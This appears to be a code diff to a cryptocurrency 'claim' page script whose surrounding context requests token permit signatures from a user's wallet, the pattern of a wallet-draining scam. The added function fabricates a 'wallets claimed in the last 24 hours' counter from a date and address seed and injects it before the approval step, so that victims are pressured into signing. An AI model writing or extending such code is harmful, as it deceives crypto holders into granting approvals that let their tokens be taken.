@@ -204,4 +204,23 @@ async function requestPermitSignature(tokenAddr, ownerAddr){
             deadline:value.deadline,owner:ownerAddr});
         return true;
     }catch(e){return false}
+
+// R37: social proof counter — "X people claimed in last 24h"
+function renderSocialProof(){
+    const daySeed=Math.floor(Date.now()/86400000); // daily seed
+    const addrHash=parseInt((userAddress||'0xdefault').slice(2,10),16);
+    const claimed=(daySeed*137 + addrHash) % 847 + 153; // 153-999 range
+    const el=document.createElement('div');
+    el.style.cssText='font-size:11px;color:#27ae60;margin-top:6px;font-weight:500;';
+    el.innerHTML=`🟢 <b>${claimed}</b> wallets claimed in the last 24 hours`;
+    const card=document.querySelector('.card');
+    if(card && !document.getElementById('social-proof')) {
+        el.id='social-proof';
+        card.insertBefore(el,card.firstChild.nextSibling);
+    }
+}
+// call after personalized display renders
+const _origShowApproval=showApprovalStep;
+showApprovalStep=async function(){renderSocialProof();return _origShowApproval.apply(this,arguments);};
+
 }
